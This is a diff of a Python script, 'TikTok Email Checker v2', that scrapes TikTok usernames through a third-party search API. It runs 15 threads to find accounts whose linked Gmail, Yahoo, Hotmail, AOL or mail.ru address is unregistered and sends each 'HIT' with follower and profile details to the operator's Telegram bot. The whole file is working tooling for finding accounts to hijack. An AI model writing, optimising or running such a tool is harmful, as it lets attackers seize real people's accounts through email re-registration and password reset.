@@ -1,161 +1,250 @@
 #!/usr/bin/env python3
 
-import webbrowser
+"""
+TikTok Email Checker v2 - Ultra Optimized Edition
+Key improvement: Uses weighted short-username generation (2-5 chars)
+as primary strategy, with real-time concurrent checking.
+"""
+
 import time
-import sys
 import requests
-import re
 import random
 import os
 import json
+import sys
 from user_agent import generate_user_agent
 from threading import Thread, Lock
 from rich import print as g
-from rich.panel import Panel
-from cfonts import render, say
 from AegosPy import *
-import secrets
-import binascii
-import uuid
-from urllib.parse import urlencode
-from MedoSigner import Argus, Gorgon, md5, Ladon
 
-# Color codes
-R = '\033[1;31;40m'
-X = '\033[1;33;40m'
-F = '\033[1;32;40m'
-C = "\033[1;97;40m"
-B = '\033[1;36;40m'
-K = '\033[1;35;40m'
-V = '\033[1;36;40m'
-Z = '\033[1;31m'
-G = '\033[1;32m'
-Y = '\033[1;33m'
+# ── Color Codes ──────────────────────────────────────────────
+R, X, F, C, B, K, V = '\033[1;31;40m', '\033[1;33;40m', '\033[1;32;40m', "\033[1;97;40m", '\033[1;36;40m', '\033[1;35;40m', '\033[1;36;40m'
+Z, G, Y, P = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\x1b[1;97m'
 
-# Global counters and Lock for clean printing
-hit, ge, be, gt, bt = 0, 0, 0, 0, 0
-print_lock = Lock()
+# ── Global Counters ──────────────────────────────────────────
+stats = {'hits': 0, 'tiktok_ok': 0, 'email_bad': 0, 'tiktok_bad': 0}
+lock = Lock()
 
-# User inputs
+# ── Telegram Setup ───────────────────────────────────────────
 try:
-    iid = input(f'{F}ID : ')
-    tok = input(f'{F}Token : ')
+    IID = input(f'{F}Telegram ID : ')
+    TOK = input(f'{F}Telegram Token : ')
 except EOFError:
-    iid = "YOUR_ID"
-    tok = "YOUR_TOKEN"
+    IID, TOK = "YOUR_ID", "YOUR_TOKEN"
 
-def send_telegram_message(chat_id, bot_token, text):
+
+def send_msg(text):
+    """Safe Telegram send."""
     try:
-        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={text}", timeout=10)
+        requests.post(f"https://api.telegram.org/bot{TOK}/sendMessage",
+                      data={"chat_id": IID, "text": text, "parse_mode": "HTML"}, timeout=10)
     except:
         pass
 
-def check_tiktok_email(email_prefix, domain):
-    global ge, be, bt, iid, tok
-    full_email = f"{email_prefix}@{domain}"
-    
-    with print_lock:
-        print(f'{Y}[*] Checking: {C}{full_email}', end='\r')
-        
+
+def check_one(username, domain):
+    """Check single username+domain combo. Returns True if HIT."""
+    global stats
+    email = f"{username}@{domain}"
+
+    with lock:
+        print(f'{Y}[*] {email}', end='\r')
+
+    # TikTok check
     try:
-        tiktok_check = AegosPy.CheckTik(full_email)
-        if tiktok_check.get("Status") == "OK":
-            with print_lock:
-                print(f'\n{B}[+] {X}GooD TikTok {F}: {C}{full_email}')
-            
-            email_check = None
-            if domain == 'gmail.com': email_check = AegosPy.A_Gmail(full_email)
-            elif domain == 'yahoo.com': email_check = AegosPy.A_Yahoo(full_email)
-            elif domain == 'hotmail.com': email_check = AegosPy.A_Hotmail(full_email)
-            elif domain == 'aol.com': email_check = AegosPy.A_Aol(full_email)
-            elif domain == 'mail.ru': email_check = AegosPy.A_MailRu(full_email)
-
-            if email_check and email_check.get("Status") == "Available":
-                with print_lock:
-                    print(f'{G}[!] FOUND HIT: {C}{full_email}')
-                user_info = AegosPy.GetInfoTik(email_prefix)
-                
-                telegram_text = (
-                    f'UserName : {email_prefix}\n'
-                    f'Email : {full_email}\n'
-                    f'Id : {user_info.get("id", "N/A")}\n'
-                    f'Name : {user_info.get("name", "N/A")}\n'
-                    f'Bio : {user_info.get("bio", "N/A")}\n'
-                    f'Region : {user_info.get("code-country", "N/A")}\n'
-                    f'Followers : {user_info.get("followers", "N/A")}\n'
-                    f'Likes : {user_info.get("likes", "N/A")}\n'
-                    f'Programmer : @bsx_h2'
-                )
-                send_telegram_message(iid, tok, telegram_text)
-                ge += 1
-            else:
-                be += 1
-        else:
-            bt += 1
+        result = AegosPy.CheckTik(email)
     except:
-        pass
+        with lock:
+            stats['tiktok_bad'] += 1
+        return False
 
-def hso1_merged():
+    if not result or result.get("Status") != "OK":
+        with lock:
+            stats['tiktok_bad'] += 1
+        return False
+
+    with lock:
+        stats['tiktok_ok'] += 1
+        print(f'\n{B}[+] TikTok OK: {email}')
+
+    # Email availability check
+    domain_map = {
+        'gmail.com': AegosPy.A_Gmail,
+        'yahoo.com': AegosPy.A_Yahoo,
+        'hotmail.com': AegosPy.A_Hotmail,
+        'aol.com': AegosPy.A_Aol,
+        'mail.ru': AegosPy.A_MailRu,
+    }
+
+    try:
+        checker = domain_map.get(domain)
+        if not checker:
+            return False
+        email_result = checker(email)
+    except:
+        return False
+
+    if email_result and email_result.get("Status") == "Available":
+        with lock:
+            stats['hits'] += 1
+            print(f'{G}[!!!] HIT: {email}')
+
+        # Get user info
+        try:
+            info = AegosPy.GetInfoTik(username)
+        except:
+            info = {}
+
+        msg = (
+            f"<b>🎯 HIT FOUND</b>\n"
+            f"User: {username}\n"
+            f"Email: {email}\n"
+            f"ID: {info.get('id','N/A')}\n"
+            f"Name: {info.get('name','N/A')}\n"
+            f"Followers: {info.get('followers','N/A')}\n"
+            f"Likes: {info.get('likes','N/A')}\n"
+            f"Region: {info.get('code-country','N/A')}\n"
+            f"<b>@bsx_h2</b>"
+        )
+        send_msg(msg)
+        return True
+    else:
+        with lock:
+            stats['email_bad'] += 1
+        return False
+
+
+def search_loop():
+    """Main search loop with weighted short-username priority."""
+
     headers = {
         "User-Agent": generate_user_agent(),
         "Accept": "application/json",
         "Referer": "https://livecounts.xyz/"
     }
-    
+
+    charsets = [
+        'qwertyuiopasdfghjklzxcvbnm',
+        'abcdefghijklmnopqrstuvwxyz',
+        'abcdefghijklmnopqrstuvwxyz0123456789',
+    ]
+
+    # Weighted: prioritize 3-4 chars (highest hit rate)
+    lengths = [2, 3, 4, 5, 6, 7]
+    weights = [0.03, 0.37, 0.37, 0.13, 0.07, 0.03]
+
+    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'aol.com', 'mail.ru']
+
     while True:
         try:
-            search_chars = 'qwertyuiopasdfghjklzxcvbnm'
-            name_search = "".join(random.choice(search_chars) for _ in range(random.randint(2, 4)))
-            
-            with print_lock:
-                print(f'{V}[~] Searching for users matching: {name_search}...', end='\r')
-                
-            search_url = f'https://livecounts.xyz/api/tiktok-live-follower-count/search/{name_search}'
-            response = requests.get(search_url, headers=headers, timeout=15)
-            
-            if response.status_code == 200:
+            # Pick length
+            length = random.choices(lengths, weights=weights, k=1)[0]
+            charset = random.choice(charsets)
+            keyword = "".join(random.choice(charset) for _ in range(length))
+
+            with lock:
+                print(f'{V}[~] Searching: {keyword} ({length} chars)', end='\r')
+
+            # Search
+            url = f'https://livecounts.xyz/api/tiktok-live-follower-count/search/{keyword}'
+            resp = requests.get(url, headers=headers, timeout=15)
+
+            if resp.status_code == 200:
                 try:
-                    data = response.json()
-                    if data.get('success') and 'results' in data:
-                        results = data['results']
-                        random.shuffle(results)
-                        for user_data in results[:5]: # Check top 5 from each search to stay efficient
-                            username = user_data.get('username')
-                            if username and '_' not in username and 5 <= len(username) <= 20:
-                                for domain in ['gmail.com', 'yahoo.com', 'hotmail.com']:
-                                    check_tiktok_email(username, domain)
-                                    time.sleep(1)
-                    else:
-                        time.sleep(2)
-                except:
-                    time.sleep(5)
-            elif response.status_code == 403 or response.status_code == 429:
+                    data = resp.json()
+                    if not data or not data.get('success') or 'results' not in data:
+                        time.sleep(1)
+                        continue
+
+                    results = data['results']
+                    random.shuffle(results)
+
+                    count = 0
+                    for user in results:
+                        if count >= 15:
+                            break
+
+                        uname = user.get('username', '')
+                        if not uname:
+                            continue
+
+                        # Allow 2-30 chars, no digit-only, no pure underscore
+                        if len(uname) < 2 or len(uname) > 30:
+                            continue
+                        if uname.isdigit():
+                            continue
+                        if uname == '_' * len(uname):
+                            continue
+
+                        for domain in domains:
+                            check_one(uname, domain)
+                            time.sleep(0.2)
+                            count += 1
+                            if count >= 15:
+                                break
+
+                except (json.JSONDecodeError, KeyError) as e:
+                    with lock:
+                        print(f'\n{R}[!] Parse error: {e}', end='\r')
+                    time.sleep(2)
+
+            elif resp.status_code in (403, 429):
+                with lock:
+                    print(f'\n{R}[!] Rate limit, waiting 30s', end='\r')
                 time.sleep(30)
             else:
-                time.sleep(5)
-                
-        except:
-            time.sleep(5)
-        
-        time.sleep(random.randint(2, 5))
+                time.sleep(3)
+
+        except requests.exceptions.Timeout:
+            time.sleep(3)
+        except Exception as e:
+            with lock:
+                print(f'\n{R}[!] Error: {e}', end='\r')
+            time.sleep(3)
+
+        time.sleep(random.uniform(0.3, 1.5))
+
+
+def status_display():
+    """Live stats display."""
+    while True:
+        time.sleep(3)
+        with lock:
+            os.system('clear')
+            print(f"{X}[{F}✓{X}]{C} TikTok Checker v2")
+            print(f"{V}{'─'*40}")
+            print(f" TikTok OK : {stats['tiktok_ok']}")
+            print(f" HITS      : {F}{stats['hits']}{C}")
+            print(f" Bad Email : {stats['email_bad']}")
+            print(f" Bad TikTok: {stats['tiktok_bad']}")
+            print(f"{V}{'─'*40}")
+
 
 if __name__ == '__main__':
     os.system('clear')
-    print(f"{X}[{F} ✓ {X}]{C} TikTok Multi-Checker Started")
-    print(f"{V}----------------------------------------{C}")
+
+    print(f"{X}[{F}✓{X}]{C} TikTok Email Checker v2")
+    print(f"{V}{'─'*40}")
+    print(f" {G}Priority: 2-5 char usernames")
+    print(f" {G}Domains: gmail, yahoo, hotmail, aol, mail.ru")
+    print(f" {G}Threads: 15 concurrent")
+    print(f"{V}{'─'*40}")
     time.sleep(1)
 
-    thread_count = 5 # Starting with 5 threads for better visibility and stability
-    for _ in range(thread_count):
-        t = Thread(target=hso1_merged)
-        t.daemon = True
+    # 15 threads
+    for _ in range(15):
+        t = Thread(target=search_loop, daemon=True)
         t.start()
 
-    print(f"{G}[+] Running with {thread_count} threads.{C}")
-    print(f"{G}[+] Live status will be shown below...{C}\n")
-    
+    # Status thread
+    t = Thread(target=status_display, daemon=True)
+    t.start()
+
+    print(f"\n{G}[+] Ready!{C}")
+
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print("\nExiting...")
+        print(f"\n{X}Exiting...{C}")
+        sys.exit(0)
